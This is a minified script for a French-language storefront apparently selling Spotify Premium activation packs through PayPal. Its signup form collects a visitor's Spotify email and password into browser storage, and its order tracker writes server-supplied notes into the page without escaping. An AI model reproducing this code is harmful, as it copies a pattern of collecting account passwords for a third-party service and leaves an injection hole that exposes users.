"use strict";(()=>{function d(){let e=document.getElementById("cookie-consent"),t=document.getElementById("accept-cookies"),n=document.getElementById("reject-cookies");!e||!t||!n||(localStorage.getItem("cookieConsent")||(e.style.display="block"),t.addEventListener("click",()=>{localStorage.setItem("cookieConsent","accepted"),e.style.display="none"}),n.addEventListener("click",()=>{localStorage.setItem("cookieConsent","rejected"),e.style.display="none"}))}function m(){let e=document.querySelector(".feature-slider");if(!e)return;let t=e.querySelector(".feature-slide-track"),n=!1,o,r,i=s=>{n=!0,e.classList.add("dragging"),o=s-e.offsetLeft,r=e.scrollLeft},c=()=>{n=!1,e.classList.remove("dragging")},a=s=>{if(!n)return;let l=s-e.offsetLeft-o;e.scrollLeft=r-l};e.addEventListener("mousedown",s=>i(s.pageX)),e.addEventListener("touchstart",s=>i(s.touches[0].pageX),{passive:!0}),window.addEventListener("mouseup",c),e.addEventListener("touchend",c),e.addEventListener("mousemove",s=>a(s.pageX)),e.addEventListener("touchmove",s=>a(s.touches[0].pageX),{passive:!0})}function E(){let e=document.getElementById("signup-form");e&&e.addEventListener("submit",t=>{t.preventDefault();let n=document.getElementById("hero-email").value.trim(),o=document.getElementById("hero-password").value.trim();!n||!o||(sessionStorage.setItem("spotifyEmail",n),sessionStorage.setItem("spotifyPassword",o),window.location.href="paiement.html")})}function k(){let e=document.getElementById("order-form");if(!e)return;let t=document.getElementById("order-btn"),n=e.querySelectorAll('.consent-checks input[type="checkbox"]'),o=document.getElementById("cmd-email"),r=document.getElementById("cmd-password"),i=()=>{if(!t||!o||!r)return;let c=Array.from(n).every(l=>l.checked),a=o.checkValidity()&&o.value.trim()!=="",s=r.value.trim()!=="";t.disabled=!(c&&a&&s)};e.addEventListener("input",i),e.addEventListener("change",i),i()}function u(){E(),k()}function L(){let e=document.querySelector(".mobile-menu-btn"),t=document.querySelector(".nav");e&&t&&e.addEventListener("click",()=>{t.classList.toggle("active"),e.classList.toggle("active")})}function I(){document.querySelectorAll(".faq-item").forEach(e=>{e.querySelector("h4").addEventListener("click",()=>e.classList.toggle("open"))})}function p(){let e=document.querySelector("header"),t=document.getElementById("back-to-top"),n=document.getElementById("theme-toggle");if(e){let o=()=>{window.scrollY>80?e.classList.add("header--scrolled"):e.classList.remove("header--scrolled")};window.addEventListener("scroll",o,{passive:!0}),o()}L(),I()}var w="https://script.google.com/macros/s/AKfycbxEmJdgcerK1ENvsy8IvSnAZDJ6p4fr9hfO87haKbKrVXZaRf2Z3wnRzyQSDl527VtW/exec";function g(e){let t=document.getElementById("progress-bar-fill"),n=document.querySelectorAll(".step");if(!t||!n.length)return;let o=0;e===1?o=0:e===2?o=20:e===3?o=40:e===4?o=60:e===5&&(o=100),t.style.width=o+"%",n.forEach((r,i)=>{let c=i+1;r.classList.remove("active","completed"),c<e?r.classList.add("completed"):c===e&&r.classList.add("active")})}async function b(e){let t=document.getElementById("loading-overlay");t&&(t.style.display="flex");try{let n=await fetch(`${w}?orderID=${e}`);if(!n.ok)throw new Error("Network response was not ok.");let o=await n.json();return o.error?null:o}catch(n){return console.error("Failed to fetch tracking data:",n),null}finally{t&&(t.style.display="none")}}function S(e,t){if(t.innerHTML="",t.classList.remove("hidden"),!e){t.innerHTML='<p class="error-message">Commande non trouv\xE9e. Veuillez v\xE9rifier le num\xE9ro et r\xE9essayer.</p>';return}let o={pending:{text:"En attente",step:1},processing:{text:"En traitement",step:2},completed:{text:"Termin\xE9e",step:3}}[e.status]||{text:"Inconnu",step:0},r=`
        <div class="tracking-header">
            <div class="tracking-info">
                <h3>Commande #${e.orderID}</h3>
                <p class="tracking-date">Date: ${new Date(e.date).toLocaleDateString()}</p>
            </div>
            <div class="tracking-status">
                <span class="status-badge status-${e.status}">${o.text}</span>
            </div>
        </div>
        <div class="tracking-timeline">
            <div class="timeline-item ${o.step>=1?"completed":""}">
                <div class="timeline-icon">\u{1F4DD}</div>
                <div class="timeline-content"><h4>Commande Re\xE7ue</h4><p>Votre commande a \xE9t\xE9 enregistr\xE9e.</p></div>
            </div>
            <div class="timeline-item ${o.step>=2?"completed":""}">
                <div class="timeline-icon">\u2699\uFE0F</div>
                <div class="timeline-content"><h4>En Traitement</h4><p>Nous pr\xE9parons l'activation de votre compte.</p></div>
            </div>
            <div class="timeline-item ${o.step>=3?"completed":""}">
                <div class="timeline-icon">\u2705</div>
                <div class="timeline-content"><h4>Activation Termin\xE9e</h4><p>Votre abonnement est actif. Un email de confirmation a \xE9t\xE9 envoy\xE9.</p></div>
            </div>
        </div>
        ${e.notes?`<div class="tracking-notes"><h4>Notes:</h4><p>${e.notes}</p></div>`:""}
    `;t.innerHTML=r}function B(){let e=document.getElementById("track-order-btn"),t=document.getElementById("order-number"),n=document.querySelector(".tracking-result");if(e&&t&&n){let o=async()=>{let r=t.value.trim();if(!r){alert("Veuillez entrer un num\xE9ro de commande.");return}let i=await b(r);S(i,n)};e.addEventListener("click",o),t.addEventListener("keypress",r=>{r.key==="Enter"&&o()})}}function T(){if(!document.getElementById("activation-progress"))return;let t=1;g(t);let n=setInterval(()=>{if(t++,t>5){clearInterval(n);return}g(t)},2e3)}function f(){document.getElementById("activation-progress")&&T(),document.querySelector(".tracking-search")&&B()}function v(){let e=document.querySelectorAll("[data-reveal]");if(e.length===0)return;let t=new IntersectionObserver((n,o)=>{n.forEach(r=>{if(r.isIntersecting){let i=r.target.dataset.revealDelay||"0s";r.target.style.transitionDelay=i,r.target.classList.add("revealed"),o.unobserve(r.target)}})},{root:null,rootMargin:"0px",threshold:.1});e.forEach(n=>{let o=parseFloat(n.dataset.revealThreshold)||.1;t.observe(n)})}function h(){let e=document.querySelector(".hero__visual");if(!e)return;let t=()=>{let n=window.scrollY;e.style.transform=`translateY(${n*.1}px)`};window.addEventListener("scroll",()=>{window.requestAnimationFrame(t)},{passive:!0})}function y(){if(!document.getElementById("paypal-button-container"))return;let e=document.getElementById("order-btn"),t=document.getElementById("paypal-button-container"),n=document.getElementById("order-form");e&&t&&n&&e.addEventListener("click",r=>{r.preventDefault(),n.checkValidity()?(e.style.display="none",o()):n.reportValidity()});function o(){if(typeof paypal>"u"){console.error("PayPal SDK not loaded.");return}paypal.Buttons({createOrder:function(r,i){return i.order.create({purchase_units:[{description:"Pack Activation Spotify Premium 12 mois INDIVIDUEL",amount:{value:"82.62",currency_code:"CAD"}}]})},onApprove:function(r,i){return i.order.capture().then(function(c){console.log("Transaction completed by "+c.payer.name.given_name),console.log("Transaction details:",c),alert("Transaction compl\xE9t\xE9e ! Merci pour votre achat."),t&&(t.innerHTML="<h3>Merci pour votre paiement !</h3>")})},onError:function(r){console.error("PayPal Checkout onError",r),alert("Une erreur est survenue durant le paiement. Veuillez r\xE9essayer.")}}).render("#paypal-button-container").catch(r=>{console.error("Failed to render PayPal buttons",r)})}}document.addEventListener("DOMContentLoaded",()=>{d(),m(),u(),p(),f(),v(),h(),y()});})();
